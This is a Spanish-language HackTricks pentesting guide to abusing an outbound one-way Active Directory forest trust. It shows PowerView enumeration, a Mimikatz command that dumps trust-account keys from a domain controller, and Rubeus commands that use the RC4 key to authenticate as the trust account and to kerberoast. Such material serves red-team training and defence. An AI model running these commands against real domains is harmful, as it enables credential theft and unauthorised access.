# Dominio Forestal Externo - Unidireccional (Saliente)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

En este escenario, **tu dominio** está **confiando** algunos **privilegios** a un principal de **dominios diferentes**.

## Enumeración

### Confianza Saliente
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Ataque a la cuenta de confianza

Cuando se establece una confianza de dominio o bosque de Active Directory desde un dominio _B_ a un dominio _A_ (_**B**_ confía en A), se crea una cuenta de confianza en el dominio **A**, llamada **B. Kerberos trust keys**. Estas claves se derivan de la **contraseña de la cuenta de confianza** y se utilizan para **encriptar los TGTs inter-realm**, cuando los usuarios del dominio A solicitan tickets de servicio para servicios en el dominio B.

Es posible obtener la contraseña y el hash de la cuenta de confianza desde un Controlador de Dominio utilizando:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
El riesgo se debe a que la cuenta de confianza B$ está habilitada, **el Grupo Principal de B$ es Domain Users del dominio A**, cualquier permiso otorgado a Domain Users se aplica a B$, y es posible utilizar las credenciales de B$ para autenticarse en el dominio A.

{% hint style="warning" %}
Por lo tanto, desde el dominio de confianza es posible obtener un usuario dentro del dominio confiable. Este usuario no tendrá muchos permisos (probablemente solo Domain Users), pero podrás **enumerar el dominio externo**.
{% endhint %}

En este ejemplo, el dominio de confianza es `ext.local` y el confiable es `root.local`. Por lo tanto, se crea un usuario llamado `EXT$` dentro de `root.local`.
```bash
# Use mimikatz to dump trusted keys
lsadump::trust /patch
# You can see in the output the old and current credentials
# You will find clear text, AES and RC4 hashes
```
Por lo tanto, en este punto tenemos la **contraseña en texto claro y la clave secreta de Kerberos de `root.local\EXT$`**. Las claves secretas AES de Kerberos de `root.local\EXT$` son idénticas a las claves de confianza AES, ya que se utiliza una sal diferente, pero las claves RC4 son las mismas. Por lo tanto, podemos **utilizar la clave de confianza RC4** extraída de ext.local para **autenticarnos** como `root.local\EXT$` frente a `root.local`.
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Con esto puedes comenzar a enumerar ese dominio e incluso obtener tickets de Kerberos de los usuarios:
```
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Obtención de la contraseña de confianza en texto claro

En el flujo anterior se utilizó el hash de confianza en lugar de la **contraseña en texto claro** (que también fue **extraída por mimikatz**).

La contraseña en texto claro se puede obtener convirtiendo la salida \[ CLEAR ] de mimikatz de hexadecimal y eliminando los bytes nulos '\x00':

![](<../../.gitbook/assets/image (2) (1) (2) (1).png>)

A veces, al crear una relación de confianza, el usuario debe ingresar una contraseña para la confianza. En esta demostración, la clave es la contraseña de confianza original y, por lo tanto, legible para los humanos. A medida que la clave cambia (cada 30 días), la contraseña en texto claro ya no será legible para los humanos pero técnicamente aún utilizable.

La contraseña en texto claro se puede utilizar para realizar autenticación regular como la cuenta de confianza, como alternativa a solicitar un TGT utilizando la clave secreta de Kerberos de la cuenta de confianza. Aquí, consultando root.local desde ext.local para miembros de Domain Admins:

![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)

## Referencias

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
